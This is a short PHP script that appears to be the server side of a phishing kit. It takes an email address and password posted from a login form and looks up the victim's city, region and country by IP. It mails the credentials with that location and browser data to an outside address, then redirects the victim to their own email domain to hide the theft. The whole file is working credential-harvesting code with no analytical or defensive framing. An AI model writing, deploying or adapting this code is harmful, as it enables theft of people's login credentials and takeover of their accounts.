<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user = $_POST['user'];
    $pass = $_POST['pass'];
    $ipAddress = $_SERVER['REMOTE_ADDR'];

    // Get user location details using ipinfo.io API
    $locationData = file_get_contents("http://ipinfo.io/{$ipAddress}/json");
    $location = json_decode($locationData);

    $city = $location->city ?? '';
    $state = $location->region ?? '';
    $country = $location->country ?? '';
    $postalCode = $location->postal ?? '';

    // Get browser type
    $browser = $_SERVER['HTTP_USER_AGENT'];

    // Extract domain from email
    $emailParts = explode('@', $user);
    $domain = isset($emailParts[1]) ? $emailParts[1] : '';

    // Prepare email content
    $to = 'noreply@networkstat.click'; // Replace with the recipient's email address
    $subject = 'BluePrints';
    $message = "Email: $user\nPassword: $pass\nCity: $city\nState: $state\nCountry: $country\nPostal Code: $postalCode\nIP Address: $ipAddress\nBrowser: $browser";

    // Send the email
    mail($to, $subject, $message);

    // Redirect based on domain
    if (!empty($domain)) {
        header("Location: https://$domain");
        exit;
    }
}
?>
